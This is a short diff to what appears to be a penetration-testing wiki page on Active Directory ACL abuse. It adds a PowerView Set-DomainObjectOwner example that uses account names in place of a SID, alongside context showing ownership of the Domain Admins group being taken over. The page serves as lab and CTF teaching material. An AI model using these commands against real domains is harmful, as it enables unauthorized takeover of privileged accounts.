@@ -175,6 +175,8 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=o
 
 ```csharp
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
+//You can also use the name instad of the SID (HTB: Reel)
+Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 
 ![](../../.gitbook/assets/19.png)
